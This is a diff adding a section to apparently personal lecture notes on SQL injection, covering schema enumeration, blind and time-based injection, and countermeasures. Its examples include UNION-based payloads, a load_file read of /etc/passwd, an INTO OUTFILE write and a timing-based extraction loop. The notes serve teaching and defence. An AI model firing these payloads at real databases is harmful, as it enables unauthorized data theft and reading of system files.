@@ -163,3 +163,140 @@ We talk about inferential attack when there is no actual transfer of data, but t
 Terminating the query properly can be cumbersome, in fact, frequently, the problem comes from what follows the integrated user parameter. This SQL segment if part of the query and the malicious input must be crafted to handle it without generating syntax errors.
 Usually the parameters include comment symbols like: `#`, `--`, `/*...*/`.
 
+### SQLi with missing infos
+Known all the methods to do SQL injection, how can you retrieve how tables and columns are named? There are two techniques:
+- brute forcing
+- `INFORMATION_SCHEMA`
+
+Information schema are metadata about the objects within a database, and can be used to gather data about any table from the available databases
+
+>[!info] Information schema example
+>- `INFORMATION_SCHEMA.TABLES`
+>	- `TABLE_SCHEMA` → DB to which the table belongs
+>	- `TABLE_NAME` → name of the table
+>	- `TABLE_ROWS` → Number of rows in the table
+>	- …
+>- `INFORMATION_SCHEMA.COLUMNS`
+>	- `TABLE_NAME`: name of the table containing this column
+>	- `COLUMN_NAME` → name of the column
+>	- `COLUMN_TYPE` → type of the columns
+>	- …
+
+>[!example]- Attack example
+>Vulnerable query:
+>```sql
+>$q="SELECT username FROM users WHERE user id=$id";
+>```
+>
+>Get table name:
+>```sql
+>$id = "−1 UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema != 'mysql' AND table_schema != 'information_schema' ";
+>```
+>
+>Get columns name:
+>```sql
+>$id = "−1 UNION SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'users' LIMIT 0,1";
+>```
+
+### Blind SQLi
+When systems do not allow you to see output in the form of error messages or extracted database fields whilst conducting SQL injection, can we sill exploit it?
+
+```sql
+$q = 'SELECT col FROM example WHERE id='.$_GET['id'];
+$res = mysql query($q);
+if(!$res) {
+	die("error");
+} else {
+	// does something, but never prints anything about it
+}
+```
+
+>[!example]- MySQL file operations
+>Vulnerable query:
+>```sql
+>$q = "SELECT username FROM users WHERE user id = $id";
+>```
+>
+>Read file:
+>```sql
+>$id = "" −1 UNION SELECT load file('/etc/passwd') ";
+>```
+>
+>Write file:
+>```sql
+>$id = " −1 UNION SELECT 'hi' into outfile '/tmp/hi' ”;
+>```
+>
+>>[!info]
+>>1) file operations fail if `FILE` permission is not granted
+>>2) load file returns `NULL` upon failure
+>>3) into outfile triggers a MySQL `ERROR`
+
+#### Exploiting blind SQLi
+To exploit blind SQLi we can use:
+- `BENCHMARK` (or `SLEEP`) → `BENCHMARK(loop count, expression)`
+- `IF` → `IF(expression, expr true, expr false)`
+- `SUBSTRING`
+	- `SUBSTRING(str, pos)`
+	- `SUBSTRING(str, FROM pos)`
+	- `SUBSTRING(str, pos, len)`
+	- `SUBSTRING(str, FROM pos, FOR len)`
+
+>[!example]- Time-based inference
+>![[Pasted image 20251117101858.png]]
+>
+>>[!example] Combining IF and time-based output
+>>![[Pasted image 20251117101932.png]]
+>>
+>>>[!example] Information extraction with substr
+>>>![[Pasted image 20251117102041.png]]
+
+>[!example] Pseudo-code: extraction with substr
+>```sql
+>charset = ['a', 'b', 'c', ...]
+>i=1
+>content = ""
+>while i < LENGTH:
+># we can esteem the length or stop when the inner for
+># performs a full loop without finding any good letter
+>for c in charset:
+>	q = "−1 UNION SELECT IF( ( SELECT substr( col, %d, 1) FROM example 
+>		WHERE id = 1
+>		) = '%c',
+>		BENCHMARK(50000000, MD5(1)),
+>		0)" % ( i, c )
+>before = time()
+># send web request injecting q
+>if (time() − before) >8:
+>	content += c
+>	break
+>i += 1
+>```
+>
+
+
+### SQLi countermeasures
+There are three types of countermeasures:
+- manual defensive coding practices
+- parameterized query insertion
+- SQL DOM
+
+#### Defensive coding practices
+Programmers must take care of input sanitization and they often rely on “automagic“ methods (e.g., in PHP, `magic_quotes_gpc` escapes calling `addslashes()`)
+
+How to sanitize strongly depends on which kind of attack we want to prevent
+
+To avoid manually crafted regexps the best practice is to use `mysql_real_escape_string()` or if a number is expected, check that the input really is a
+number
+
+#### Parametrized queries and SQL DOM
+Parametrized query (if the language supports it):
+
+```sql
+cursor.execute("INSERT INTO table VALUES (%s, %s, %s)", var1, var2, var3)
+```
+
+SQL DOM is a set of classes that enables automated data type validation and escaping, using encapsulation of database queries. The query-building process changes from an unregulated one that uses string concatenation to a systematic one that uses a type-checked API
+
+---
+## Database access control
